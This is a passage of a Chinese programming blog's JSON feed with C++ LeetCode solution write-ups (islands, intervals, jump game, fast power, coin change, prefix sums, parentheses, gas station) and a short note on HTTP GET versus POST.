class=\"headerlink\" title=\"深度优先搜索\"></a>深度优先搜索</h2><pre><code class=\"cpp\">class Solution {\npublic:\n    void dfs(vector&lt;vector&lt;char&gt;&gt;&amp; grid,int r,int c)\n        {\n            int m=grid.size(),n=grid[0].size();\n            grid[r][c]='0';\n            if(r-1&gt;=0&amp;&amp;grid[r-1][c]=='1')  dfs(grid,r-1,c);\n            if(r+1&lt;m&amp;&amp;grid[r+1][c]=='1')  dfs(grid,r+1,c);\n            if(c-1&gt;=0&amp;&amp;grid[r][c-1]=='1')  dfs(grid,r,c-1);\n            if(c+1&lt;n&amp;&amp;grid[r][c+1]=='1')  dfs(grid,r,c+1);\n        }\n    int numIslands(vector&lt;vector&lt;char&gt;&gt;&amp; grid) {\n        int m=grid.size(),n=grid[0].size();\n        if(m==0)return 0;\n        int ans=0;\n        for(int i=0;i&lt;m;i++)\n        {\n            for(int j=0;j&lt;n;j++)\n            {\n                if(grid[i][j]=='1')\n                {\n                    ans++;\n                    dfs(grid,i,j);\n                }\n            }\n        }\n        return ans;\n    }\n};\n</code></pre>\n<h2 id=\"广度优先搜索-1\"><a href=\"#广度优先搜索-1\" class=\"headerlink\" title=\"广度优先搜索\"></a>广度优先搜索</h2><pre><code class=\"cpp\">class Solution {\npublic:\n    int numIslands(vector&lt;vector&lt;char&gt;&gt;&amp; grid) {\n        int m=grid.size(),n=grid[0].size();\n        if(m==0)  \n            return 0;\n        int ans=0;\n        for(int i=0;i&lt;m;i++)\n        {\n            for(int j=0;j&lt;n;j++)\n            {\n                if(grid[i][j]=='1')\n                {\n                    ans++;\n                    grid[i][j]='0';\n                    queue&lt;pair&lt;int,int&gt;&gt;s;\n                    s.push({i,j});\n                    while(!s.empty())\n                    {\n                        auto [r,c]=s.front();\n                        s.pop();\n                        if(r-1&gt;=0&amp;&amp;grid[r-1][c]=='1')\n                        {\n                            grid[r-1][c]='0';\n                            s.push({r-1,c});\n                        }\n                        if(r+1&lt;m&amp;&amp;grid[r+1][c]=='1')\n                        {\n                            grid[r+1][c]='0';\n                            s.push({r+1,c});\n                        }\n                        if(c-1&gt;=0&amp;&amp;grid[r][c-1]=='1')\n                        {    \n                            grid[r][c-1]='0';\n                            s.push({r,c-1});\n                        }\n                        if(c+1&lt;n&amp;&amp;grid[r][c+1]=='1')\n                        {\n                            grid[r][c+1]='0';\n                            s.push({r,c+1});\n                        }\n\n                    }\n                }\n            }\n        }\n        return ans;\n    }\n};\n</code></pre>\n",
            "tags": [
                "深度优先搜索",
                "广度优先搜索"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/5beb97b2/",
            "url": "http://dpm12345.cn/posts/5beb97b2/",
            "title": "无重叠区间",
            "date_published": "2021-12-06T11:54:40.000Z",
            "content_html": "<p>题目链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS1jbi5jb20vcHJvYmxlbXMvbm9uLW92ZXJsYXBwaW5nLWludGVydmFscy8=\">无重叠区间</span></p>\n<p>题目详情：</p>\n<p><img data-src=\"/../../../post_images/%E6%97%A0%E9%87%8D%E5%8F%A0%E5%8C%BA%E9%97%B4.png\"></p>\n<p>思路：在这道题中，我们可以把题目要求所解问题换一种说法，找删去最少区间使剩下成为无重叠区间，即包含区间最多数。</p>\n<p>我们注意到，当其为无重叠区间时，前一个区间的末端必然小于等于后一个区间首端，那么我们便可以将这一组的无重叠区间的端点看作为一组不严格单调递增的序列。这样便与求 “最长上升序列” 的序列的问题相同了。</p>\n<h1 id=\"动态规划\"><a href=\"#动态规划\" class=\"headerlink\" title=\"动态规划\"></a>动态规划</h1><p>我们维护一个数组$dp[i]$，其中$dp[i]$以该位置为末尾区间的，所能得到的数量最多的无重叠区间的值。那么很容易得到，先分别枚举末尾区间位置，再从0开始遍历，寻找最长，转移方程即为： $dp[i]=max(dp[j]+1,dp[i])$（当$intervals[j][1]&lt;intervals[i][0]$时)</p>\n<p>以下为代码:</p>\n<pre><code class=\"cpp\">class Solution {\npublic:\n    int eraseOverlapIntervals(vector&lt;vector&lt;int&gt;&gt;&amp; intervals) {\n        sort(intervals.begin(),intervals.end());\n        int n=intervals.size();\n        vector&lt;int&gt;dp(n,1);\n        for(int i=0;i&lt;intervals.size();i++)\n        {\n            for(int j=0;j&lt;i;j++)\n            {\n                if(intervals[j][1]&lt;=intervals[i][0])\n                {\n                    dp[i]=max(dp[j]+1,dp[i]);\n                }\n            }\n        }\n        return n-*max_element(dp.begin(),dp.end());\n\n    }\n};\n</code></pre>\n<p>提交后很不幸，超时了，时间复杂度为$O(n^2)$, 为此我们需要将时间优化。</p>\n<h1 id=\"贪心方案\"><a href=\"#贪心方案\" class=\"headerlink\" title=\"贪心方案\"></a>贪心方案</h1><p>上面的动态规划方案中，枚举末尾，再从0开始遍历，寻找最长，这是无法避免的，为此难以优化，这样，我们可以使用贪心方案，将时间复杂度降低 </p>\n<p>实现思想: 我们要想得到最多数量的无重叠区间，那么我们需要尽可能地将区间长度较小地放入这一无重叠区间内，因此我们可以设想，如果我们将各个区间地右端点按升序排序，设一个变量<code>right</code>为目前无重叠区间的右端点，如果下一个区间的左端大于<code>right</code>，区间加一，<code>right</code>更新，这样以此类推， 最终可以得到答案 </p>\n<p>证明：由于我们是将右端点降序排序，那么当两段区间相同时，实际上无论选择哪段结果都是一样的，因为不管该区间的左端点为多少，后面的区间只要左区间不大于<code>right</code>，那么该区间必会被删。而当之后区间的左端点大于<code>right</code>时，那么此时所选取的区间的右端点必然是满足条件的最小值，也因此能够得到最多数量的无重叠区间 </p>\n<p>以下为实现代码:</p>\n<pre><code class=\"cpp\">class Solution {\npublic:\n    int eraseOverlapIntervals(vector&lt;vector&lt;int&gt;&gt;&amp; intervals) {\n        if (intervals.empty()) {\n            return 0;\n        }\n        \n        sort(intervals.begin(), intervals.end(), [](const auto&amp; u, const auto&amp; v) {\n            return u[1] &lt; v[1];\n        });\n\n        int n = intervals.size();\n        int right = intervals[0][1];\n        int ans = 1;\n        for (int i = 1; i &lt; n; ++i) {\n            if (intervals[i][0] &gt;= right) {\n                ++ans;\n                right = intervals[i][1];\n            }\n        }\n        return n - ans;\n    }\n};\n</code></pre>\n",
            "tags": [
                "队列",
                "动态规划"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/a0b7206d/",
            "url": "http://dpm12345.cn/posts/a0b7206d/",
            "title": "GET 与 POST 的区别",
            "date_published": "2021-12-06T06:07:26.000Z",
            "content_html": "<h1 id=\"不同点\"><a href=\"#不同点\" class=\"headerlink\" title=\"不同点\"></a>不同点</h1><p>GET 在浏览器回退时是无害的，而 POST 会再次提交请求。</p>\n<p>GET 产生的 URL 地址可以被 Bookmark，而 POST 不可以。</p>\n<p>GET 请求会被浏览器主动 cache，而 POST 不会，除非手动设置。</p>\n<p>GET 请求只能进行 url 编码，而 POST 支持多种编码方式。</p>\n<p>GET 请求参数会被完整保留在浏览器历史记录里，而 POST 中的参数不会被保留。</p>\n<p>GET 请求在 URL 中传送的参数是有长度限制的，而 POST 么有。</p>\n<p>对参数的数据类型，GET 只接受 ASCII 字符，而 POST 没有限制。</p>\n<p>GET 比 POST 更不安全，因为参数直接暴露在 URL 上，所以不能用来传递敏感信息。</p>\n<p>GET 参数通过 URL 传递，POST 放在 Request body 中。</p>\n<p>（本标准答案参考自 w3schools）</p>\n<p>对上面的对两种方式的安全性考虑，其实两种方式都是不安全的<br>因为 HTTP 在网络上是明文传输的，只要在网络节点上捉包，就能完整地获取数据报文，<br>要想安全传输，就只有加密，也就是 HTTPS</p>\n<h1 id=\"相同点\"><a href=\"#相同点\" class=\"headerlink\" title=\"相同点\"></a>相同点</h1><p>GET 与 POST 都是 HTTP 协议中发送请求的方法</p>\n<p>HTTP 的底层是 TCP/IP。所以 GET 和 POST 的底层也是 TCP/IP，也就是说，GET/POST 都是 TCP 链接。<br>GET 和 POST 能做的事情是一样一样的。你要给 GET 加上 request body，给 POST 带上 url 参数，技术上是完全行的通的。</p>\n<p>参考资料：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTc2OTYyMS9hcnRpY2xlL2RldGFpbHMvODM4OTQ5MTA=\">https://blog.csdn.net/weixin_41769621/article/details/83894910</span></p>\n",
            "tags": []
        },
        {
            "id": "http://dpm12345.cn/posts/6f1a75f/",
            "url": "http://dpm12345.cn/posts/6f1a75f/",
            "title": "跳跃游戏 VI",
            "date_published": "2021-12-05T06:54:40.000Z",
            "content_html": "<p>题目链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS1jbi5jb20vcHJvYmxlbXMvanVtcC1nYW1lLXZpLw==\">跳跃游戏 VI</span></p>\n<p>题目详情:</p>\n<p><img data-src=\"/../../../post_images/1696%E8%B7%B3%E8%B7%83%E6%B8%B8%E6%88%8FVI.jpg\"></p>\n<h1 id=\"初期想法\"><a href=\"#初期想法\" class=\"headerlink\" title=\"初期想法\"></a>初期想法</h1><p>看到题目，很容易想到使用动态规划算法，$dp[i]$表示跳到位置$i$能取到的最大的值,其中$dp[i]=min{dp[i-1],dp[i-2]……,dp[i-k]}+nums[i]$, 那么很容易写出代码 如图</p>\n<p><img data-src=\"/../../../post_images/%E8%B7%B3%E8%B7%83%E6%B8%B8%E6%88%8FVI_%E5%88%9D%E5%A7%8B%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92.png\"></p>\n<p>但是已提交便发现，超时了，也就是说纯纯动态规划不能完成题目要求。</p>\n<h1 id=\"反思\"><a href=\"#反思\" class=\"headerlink\" title=\"反思\"></a>反思</h1><p>思考初期想法的代码，哪里造成了代码超时呢？</p>\n<p>不难发现，在确定$i$位置前的$[i-k,i-1]$范围内的最小值时，每一个都比较了一次，而当$i$加一时，除去上次的$i-k$，和新增的$i-1$，其他位置又比较了一次，如果最大值，即比较过后仍然比较，其原因是缺少记录最大值的渠道。那么是否可以在循环时加上一个变量MAX记录$[i-k,i-1]$的最大值，当$i+1$时，将MAX与$dp[i]$比较呢？</p>\n<p>其结果是只能解决一部分，因为假设$MAX=dp[i-k]$，当$i+1$时，MAX的值明显不在之后的$[i-k,i-1]$范围之内了，因此要将原来范围内的次大值与$dp[i]$比较，这样我们又多了个任务，求次大值，所以单纯增加一个变量并不能解决问题。</p>\n<p>下面为解决方案：</p>\n<h1 id=\"优化（单调队列）\"><a href=\"#优化（单调队列）\" class=\"headerlink\" title=\"优化（单调队列）\"></a>优化（单调队列）</h1><p>经过上面的分析，我们需要存储$[i-k,i-1]$内的最大值，同时要在最大值被删去时能快速得到之后的最大值那么，队列无非是我们的选择</p>\n<p>方法：为方便，我们将元素下标存入队列中队列内的元素按降序排序，即队首为最大元素的下标，队列第二个元素即为次大值循环时，首先先确保队首元素满足在下标$[i-k,i-1]$范围内，如不满足则删除队首，然后再进行$dp[i]$的计算$dp[i]=dp[q.front()]+nums[i]$，最后向队列中存入元素$dp[i]$（若$dp[i]&gt;dp[q.back()]$, 便可将队尾元素删除，直到$dp[i]&lt;=dp[q.back]$或队列为空），这样便为后面取最大值做准备。</p>\n<p>因此，代码如下</p>\n<pre><code class=\"cpp\">class Solution {\npublic:\n    int maxResult(vector&lt;int&gt;&amp; nums, int k) {\n        int n=nums.size();\n        vector&lt;int&gt;dp(n);\n        dp[0]=nums[0];\n        deque&lt;int&gt;q;\n        q.push_back(0);\n        for(int i=1;i&lt;n;i++)\n        {\n            while(q.size()&amp;&amp;i-q.front()&gt;k)\n            {\n                q.pop_front();\n            }\n            dp[i]=dp[q.front()]+nums[i];\n            while(q.size()&amp;&amp;dp[i]&gt;dp[q.back()])\n            {\n                q.pop_back();\n            }\n            q.push_back(i);\n        }\n        return dp[n-1];\n    }\n};\n</code></pre>\n<h1 id=\"优化（优先级队列）\"><a href=\"#优化（优先级队列）\" class=\"headerlink\" title=\"优化（优先级队列）\"></a>优化（优先级队列）</h1><p>与单调队列思想相同，只是优先级队列不用进行排序</p>\n<p>以下为代码</p>\n<pre><code class=\"cpp\">class Solution {\npublic:\n    int maxResult(vector&lt;int&gt;&amp; nums, int k) {\n        int n = nums.size();\n        vector&lt;int&gt; dp(n);\n        dp[0] = nums[0];\n        priority_queue&lt;pair&lt;int, int&gt;&gt; q;\n        q.emplace(nums[0], 0);\n        for (int i = 1; i &lt; n; ++i) {\n            while (i - q.top().second &gt; k) {\n                q.pop();\n            }\n            dp[i] = q.top().first + nums[i];\n            q.emplace(dp[i], i);\n        }\n        return dp[n - 1];\n    }\n};\n</code></pre>\n",
            "tags": [
                "队列",
                "动态规划"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/20c47d09/",
            "url": "http://dpm12345.cn/posts/20c47d09/",
            "title": "快速幂",
            "date_published": "2021-12-05T02:54:40.000Z",
            "content_html": "<p>题目链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS1jbi5jb20vcHJvYmxlbXMvcG93eC1uLw==\">快速幂</span></p>\n<p>题目详情：实现 Pow (x,n)</p>\n<h1 id=\"递归\"><a href=\"#递归\" class=\"headerlink\" title=\"递归\"></a>递归</h1><p>思路：要实现$Pow(x,n)$，显然不可能用for或while循环进行一个一个$x$相乘，这样时间相对较长，那么可以做以下简化，若要求$x^n$，当n为奇数时，那么$x^n$就等于$x^{\\frac{n}{2}}$次方的的平方再乘一个$x$；当n为偶数时，$x^n$等于$x^{\\frac{n}{2}}$的平方，以此类推，递归方程就可写出以下为代码</p>\n<pre><code class=\"cpp\">class Solution {\npublic:\n    double quickMul(double x, long long N) {\n        if (N == 0) {\n            return 1.0;\n        }\n        double y = quickMul(x, N / 2);\n        return N % 2 == 0 ? y * y : y * y * x;\n    }\n\n    double myPow(double x, int n) {\n        long long N = n;\n        return N &gt;= 0 ? quickMul(x, N) : 1.0 / quickMul(x, -N);\n    }\n};\n</code></pre>\n<p>注意：代码中递归结束条件为<code>N==0</code>，而不是<code>N==1</code>；原因为考虑一开始<code>N==0</code>的情况</p>\n<h1 id=\"迭代优化\"><a href=\"#迭代优化\" class=\"headerlink\" title=\"迭代优化\"></a>迭代优化</h1><p>在递归方法中，我们是通过倒序来进行判断什么时候乘x，什么时候不乘x的，而要实现迭代优化，那么必然要正序遍历，所以现在的目的便是要找到怎样正序遍历的方法。</p>\n<p>我们再仔细想一下第一种确定乘x和不乘x的方法，是偶数不乘，是奇数则乘x，倒序遍历，或许这样说还不够明白，那么换一种说法，偶数乘x的零次方(和不乘结果相同), 而奇数乘x的1次方，倒序排列，换成这样的说法，我们很容易得到，这便是n的二进制形式，它的二进制的每一位表示着乘x的权，而每次计算时又会平方，那么也就是幂的二进制乘2，若偶数末尾即零，奇数末尾即1，如此继续下去，最后得到的值便为$x^n$的值，因此这样便可得到迭代优化后的程序</p>\n<p>代码如下:</p>\n<pre><code class=\"cpp\">class Solution {\npublic:\n    double myPow(double x, int n) {\n        double ans=1;\n        int flag=n;\n        double xc=x;         // 记录每一位如果为 1 应乘的 x 次方\n        while(n!=0)\n        {\n            if(n%2)\n                ans*=xc;\n            xc=xc*xc;               // 每进一位则平方一次 xc\n            n/=2;\n        }\n        return flag&gt;0?ans:1.0/ans;\n    }\n};\n</code></pre>\n",
            "tags": [
                "递归"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/47ade4a0/",
            "url": "http://dpm12345.cn/posts/47ade4a0/",
            "title": "爬楼梯与零钱兑换题目对比",
            "date_published": "2021-12-02T06:54:40.000Z",
            "content_html": "<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS1jbi5jb20vcHJvYmxlbXMvY2xpbWJpbmctc3RhaXJzLw==\">爬楼梯</span></p>\n<p><img data-src=\"/../../../post_images/%E7%88%AC%E6%A5%BC%E6%A2%AF.png\"></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS1jbi5jb20vcHJvYmxlbXMvY29pbi1jaGFuZ2UtMi8=\">零钱兑换 II</span></p>\n<p><img data-src=\"/../../../post_images/%E9%9B%B6%E9%92%B1%E5%85%91%E6%8D%A2II.png\"></p>\n<p>建立在做过题目的基础上，我们重新审视这几道题</p>\n<ol>\n<li><p>对于爬楼梯，由于一次只能爬一阶或两阶，故$dp[i]=dp[i-1]+dp[i-2]$<br>对于零钱兑换II，其限制因素为零钱的面额，故当$i&gt;=coin[j]$时，$dp[i]+=dp[i-coin[j]]$</p>\n<p>而现在我们将爬楼梯的限制由由只有一阶或两阶，改为一个数组$step[]={1,2}$；那么在做时，便要遍历一次$step [j]$, 当$i&gt;=step[j]$时，$dp[i]=dp[i]+dp[i-step[j]]$, 而$step[j]$便与前面的减去 1、2 相同。这样不难发现，如果将每次能跨越的楼梯阶数改为一个数组里的元素，那么爬楼梯与零钱兑换II的解题代码就十分相似了</p>\n</li>\n<li><p>接下来进行更深一层的讨论</p>\n<p>在爬楼梯题目中，我们要计算的是到达顶端的总数，每次只能一阶或两阶，由此可知，其为 若干个1和2排列，其对顺序有要求，也就是说，最后得到是排列数的结果</p>\n<p>而在零钱兑换II题目中，因为只是记录兑换一个金额的总数，先取小面额还是先取大面额是没有区别的，那么也就是说，该题求的是组合数。</p>\n<p>那么，该用什么方法区别这两种呢？</p>\n<p>下面给出两段代码</p>\n</li>\n</ol>\n<pre><code class=\"cpp\">//  amount 表示金额，n 表示硬币面额数，coin [i] 表示某个硬币\n    \n    // 第一段\n    for(int i=1;i&lt;=amount;i++)\n    {\n       for(int j=0;j&lt;n;j++)\n          {\n              if(i&gt;=coin[j])\n              {\n                  dp[i]+=dp[i-coin[j]];\n              }\n          }\n    }\n    \n    \n    // 第二段\n    for(int i=0;i&lt;n;i++)\n    {\n       for(int j=1;j&lt;=amount;j++)\n          {\n              if(j&gt;=coin[i])\n              {\n                  dp[j]+=dp[j-coin[i]];\n              }\n          }\n    }\n</code></pre>\n<p>经过代码观察，不难看出，第一段代码先枚举金额，然后嵌套<code>coin</code>硬币的循环； 第二段代码先枚举<code>coin</code>硬币面额，然后再枚举金额</p>\n<ol>\n<li><p>先看第一段代码：先枚举金额，再枚举硬币面额，也就是说每一个金额的<code>dp</code>计算都会涉及到每一种硬币,当$i&gt;=coin[j]$,意味着$i-coin[j]$后可以添加一个硬币元素$coin[j]$等于$i$,所以$dp[i]=dp[i]+dp[i-coin[j]]$,那么不难得出比如计算金额$3$时，如果硬币面额存在$1$和$2$，那么$dp[1]$和$dp[2]$的值都会加到$dp[3]$上，也,就是说首先$dp[3]+=dp[2]$,即$2，1$情况，然后$dp[3]+=dp[1]$,即$1，2$情况。很明显，”1,2”、”2,1”都计算的为排列数。</p>\n</li>\n<li><p>再看第二段代码：先枚举硬币面额，再枚举金额，也就是说每一个硬币面额都会在一种金额内计算一次，再根据循环的方式，从下标零开始遍历，知道结束，那么不难得出，$coin[i]$的值在$dp[i]$的每一种情况中，出现的顺序都是固定的，那么与上面分析相比，”1,2”、”2,1”只会出现一种，所以第二段代码计算的结果为组合数</p>\n</li>\n</ol>\n<p>下面进行代码实现</p>\n<p>注：为确保爬楼梯代码无误，增加了数组b进行检验，若正确，则应先输出34</p>\n<pre><code class=\"cpp\">#include&lt;iostream&gt;\n#include&lt;vector&gt;\nusing namespace std;\n\nclass Solution{\npublic:\n    int climb_stairs(int amount, vector&lt;int&gt;&amp;step)\n    {\n        vector&lt;int&gt;dp(amount + 1);\n        int n = step.size();\n        dp[0] = 1;\n        for (int i = 1; i &lt;= amount; i++)\n        {\n            for (int j = 0; j &lt; n; j++)\n            {\n                if (i&gt;=step[j])\n                {\n                    dp[i] += dp[i - step[j]];\n                }\n            }\n        }\n        return dp[amount];\n    }\n    int change(int amount, vector&lt;int&gt;&amp;coin)\n    {\n        vector&lt;int&gt;dp(amount + 1);\n        int n = coin.size();\n        dp[0] = 1;   // 表示金额为零的情况，\n                     // 因为零钱面额也为零，故 dp [0]=1\n        for (int i = 0; i &lt; n; i++)\n        {\n            for (int j = 1; j &lt;=amount; j++)\n            {\n                if (j&gt;=coin[i])\n                {\n                    dp[j] += dp[j - coin[i]];\n                }\n            }\n        }\n        return dp[amount];\n    }\n};\n\nint main()\n{\n    int amount = 8;\n    vector&lt;int&gt;a(3);\n    a[0] = 1; a[1] = 2; a[2] = 5;\n    vector&lt;int&gt;b(2);\n    b[0] = 1; b[1] = 2;\n    Solution A;\n    cout &lt;&lt; A.climb_stairs(amount, b) &lt;&lt; endl;      \n    cout &lt;&lt;A.climb_stairs(amount,a)  &lt;&lt; endl;\n    cout &lt;&lt; A.change(amount,a)&lt;&lt; endl;\n    return 0;\n}\n</code></pre>\n<p><img data-src=\"/../../../post_images/%E8%BE%93%E5%87%BA%E7%BB%93%E6%9E%9C.png\"></p>\n<p>将8，数组[1,2,5]分别输入leetcode控制器内检验，发现无误</p>\n<p>【2021-12-3 更新】</p>\n<p>类似的题目还有</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS1jbi5jb20vcHJvYmxlbXMvY29tYmluYXRpb24tc3VtLWl2Lw==\">组合总数</span></p>\n<p><img data-src=\"/../../../post_images/%E7%BB%84%E5%90%88%E6%80%BB%E6%95%B0IV.png\"></p>\n<p>方法类似，但需要注意题目要求不能超过32位整数范围，需添加限制，如图</p>\n<p><img data-src=\"/../../../post_images/%E5%8C%BA%E5%88%AB.png\"></p>\n",
            "tags": [
                "排列组合"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/308e5841/",
            "url": "http://dpm12345.cn/posts/308e5841/",
            "title": "有效的括号",
            "date_published": "2021-11-29T12:54:40.000Z",
            "content_html": "<p>题目链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS1jbi5jb20vcHJvYmxlbXMvcmFuZ2Utc3VtLXF1ZXJ5LTJkLWltbXV0YWJsZS8=\">二维区域和检索 - 矩阵不可变</span></p>\n<p>题目详情:</p>\n<p><img data-src=\"/../../../post_images/304%E4%BA%8C%E7%BB%B4%E5%8C%BA%E5%9F%9F%E5%92%8C%E6%A3%80%E7%B4%A2-%E7%9F%A9%E9%98%B5%E4%B8%8D%E5%8F%AF%E5%8F%98.jpg\"></p>\n<p>思路：该题考查了矩形的相关知识，同时涉及到前缀和。那么必须知道矩形的前缀和如何求。这里给出两种解法：</p>\n<ol>\n<li><p>以$sum [i][j+1]$表示$matrix$第$i$行从下标$0$到下标为$j$元素的和,那么计算左上端点为$[row1,col1]$, 右下端点为$[row2,col2]$的矩形区域内元素总和，就可以将每一行每一行加起来代码形式为$sum [i][col2+1]-sum [i][col1+1]$</p>\n</li>\n<li><p>以$sum [i][j]$表示以$[0,0]$为左上端点，$[i,j]$为右上端点的矩形区域内元素总和,那么计算左上端点为$[row1,col1]$, 右下端点为$[row2,col2]$的矩形区域内元素总和时<br> 可试着画图</p>\n</li>\n</ol>\n  <img data-src=\"../../../post_images/二维数组前缀和第二种解法.jpg\" style=\"zoom:50%;\">\n\n\n\n<p>那么由此可以推得解法代码为：<br>$$<br>sum[row2][col2]-sum[row2][col1-1]-sum[row1-1][col2]+sum[row1-1][col-1]<br>$$<br>但为了防止$col1-1$,$row1-1$越界，在创建数组时可以顺便将其行列各增加一行，排除越界情况具体代码只需下标加一即可</p>\n<p>以下为代码</p>\n<h1 id=\"解法一\"><a href=\"#解法一\" class=\"headerlink\" title=\"解法一\"></a>解法一</h1><pre><code class=\"cpp\">class NumMatrix {\npublic:\n    vector&lt;vector&lt;int&gt;&gt;sum;\n    NumMatrix(vector&lt;vector&lt;int&gt;&gt;&amp; matrix) {\n        int m=matrix.size();\n        if(m&gt;0)\n        {\n            sum.resize(m,vector&lt;int&gt;(matrix[0].size()+1));\n            for(int i=0;i&lt;m;i++)\n            {\n                for(int j=0;j&lt;matrix[0].size();j++)\n                {\n                    sum[i][j+1]=sum[i][j]+matrix[i][j];\n                }\n            }\n        }\n    }\n    \n    int sumRegion(int row1, int col1, int row2, int col2) {\n        int ans=0;\n        for(int i=row1;i&lt;=row2;i++)\n        {\n            ans+=sum[i][col2+1]-sum[i][col1];\n        }\n        return ans;\n    }\n};\n</code></pre>\n<h1 id=\"解法二\"><a href=\"#解法二\" class=\"headerlink\" title=\"解法二\"></a>解法二</h1><pre><code class=\"cpp\">class NumMatrix {\npublic:\n    vector&lt;vector&lt;int&gt;&gt;sum;\n    NumMatrix(vector&lt;vector&lt;int&gt;&gt;&amp; matrix) {\n        int m=matrix.size();\n        if(m&gt;0)\n        {\n            int n=matrix[0].size();\n            sum.resize(m+1,vector&lt;int&gt;(n+1));\n            for(int i=1;i&lt;m+1;i++)\n            {\n                for(int j=1;j&lt;n+1;j++)\n                {\n                    sum[i][j]=sum[i-1][j]+sum[i][j-1]-sum[i-1][j-1]+matrix[i-1][j-1];\n                }\n            }\n        }\n    }\n    \n    int sumRegion(int row1, int col1, int row2, int col2) {\n        return sum[row2+1][col2+1]-sum[row2+1][col1]-sum[row1][col2+1]+sum[row1][col1];\n\n    }\n};\n</code></pre>\n",
            "tags": [
                "矩阵"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/308e5841/",
            "url": "http://dpm12345.cn/posts/308e5841/",
            "title": "有效的括号",
            "date_published": "2021-11-28T13:54:40.000Z",
            "content_html": "<p>题目链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS1jbi5jb20vcHJvYmxlbXMvdmFsaWQtcGFyZW50aGVzZXMv\">有效的括号</span></p>\n<p>题目详情：</p>\n<p><img data-src=\"/../../../post_images/%E6%9C%89%E6%95%88%E7%9A%84%E6%8B%AC%E5%8F%B7_%E9%A2%98%E7%9B%AE%E8%AF%A6%E6%83%85.jpg\"></p>\n<p>思路：因为相同括号只能连续出现，那么我们可以利用栈的特性，当找到一个左括号时，压入栈；当找到一个右括号时，判断栈顶是不是与其相配对的括号，若不是，则返回<code>false</code>，是则去除栈顶元素，到最后，因为有一直压入栈顶的情况，故不能直接<code>return true</code>，而是可以返回<code>empty()</code></p>\n<p>代码如下</p>\n<pre><code class=\"cpp\">class Solution {\npublic:\n    bool isValid(string s) {\n        if(s.length()&lt;2)return false;\n        unordered_map&lt;char,char&gt;dict={\n            {')', '('},\n            {']', '['},\n            {'}', '{'}\n        };\n        stack&lt;char&gt;a;\n        for(int i=0;i&lt;s.size();i++)\n        {\n            if(dict.count(s[i]))\n            {\n                if(a.empty()||a.top()!=dict[s[i]])\n                return false;\n                a.pop();\n            }\n            else \n                a.push(s[i]);\n        }\n        return a.empty();\n    }\n};\n</code></pre>\n",
            "tags": [
                "栈"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/b115b06a/",
            "url": "http://dpm12345.cn/posts/b115b06a/",
            "title": "加油站",
            "date_published": "2021-11-27T06:20:40.000Z",
            "content_html": "<p>题目链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS5jbi9wcm9ibGVtcy9nYXMtc3RhdGlvbi8=\">加油站</span></p>\n<p>题目详情：</p>\n<p><img data-src=\"/../../../post_images/%E5%8A%A0%E6%B2%B9%E7%AB%99_%E9%A2%98%E7%9B%AE%E8%AF%A6%E6%83%85.jpg\"></p>\n<p>算法思路：贪心算法</p>\n<h1 id=\"pos-数组记录每个位置的剩余油量\"><a href=\"#pos-数组记录每个位置的剩余油量\" class=\"headerlink\" title=\"pos 数组记录每个位置的剩余油量\"></a>pos 数组记录每个位置的剩余油量</h1><ol>\n<li><p>使用另一个数组$pos$，其中$pos[i]=gas[i]-cost[i]$, 从下标$0$开始遍历，若$pos[i]&lt;0$, 则必不以此为起点；若 $pos[i]&gt;=0$, 则以其为起点，</p>\n<p> 用$res$存储当前剩余油量，之后以此为起点遍历之后位置$n$，若$pos[n]+res&lt;0$, 此起点不满足题意，若 $&gt;=0$, 则更新$res$，并使</p>\n<p> $n=(n+1)%pos.size()$，继续遍历若正常结束循环，则可以返回$i$的值</p>\n</li>\n</ol>\n<p>  以下为代码</p>\n<pre><code class=\"cpp\">class Solution {\npublic:\n    int canCompleteCircuit(vector&lt;int&gt;&amp; gas, vector&lt;int&gt;&amp; cost) {\n        if(gas.size()==1)return (gas[0]&lt;cost[0])?-1:0;\n        vector&lt;int&gt;pos(gas.size());\n        for(int i=0;i&lt;pos.size();i++)\n        {\n            pos[i]=gas[i]-cost[i];\n        }\n        for(int i=0;i&lt;pos.size();i++)\n        {\n            if(pos[i]&gt;0)\n            {\n                int res=pos[i],n=(i+1)%pos.size();\n                while(n!=i)\n                {\n                    if(pos[n]+res&lt;0)\n                    break;\n                    res+=pos[n];\n                    n=(n+1)%pos.size();\n                }\n                if(n==i)return i;\n            }\n            \n        }\n        return -1;\n    }\n};\n</code></pre>\n<ol start=\"2\">\n<li><p>优化：由上代码，当不满足$pos[n]+res&gt;=0$时，$n$即为以$i$为起点不可能到达的位置，那么这两个位置之间的位置都不可能到达$n$因为以$i$为起点，当它到两者中间位置时，初始油量大于等于零，而从$i$位置到达不了，更别说两者其中位置了由此，可增加一个变量记录每次前进的长度$num$，当以某一起点得不到答案时，使$i=i+num+1$更新$i$，提高效率</p>\n<p>代码如下</p>\n<pre><code class=\"cpp\">class Solution {\npublic:\n    int canCompleteCircuit(vector&lt;int&gt;&amp; gas, vector&lt;int&gt;&amp; cost) {\n        int n=gas.size();\n        int i=0;\n        while(i&lt;n)\n        {\n            int num=0,total_gas=0,total_cost=0;\n            while(num&lt;n)\n            {\n                int j=(i+num)%n;\n                total_gas+=gas[j];\n                total_cost+=cost[j];\n                if(total_gas&lt;total_cost)\n                break;\n                num++;\n            }\n            if(num==n)return i;\n            else\n            {\n                i=i+num+1;\n            }\n        }\n        return -1;\n\n    }\n};\n</code></pre>\n</li>\n</ol>\n",
            "tags": [
                "贪心"
            ]
        },
        {
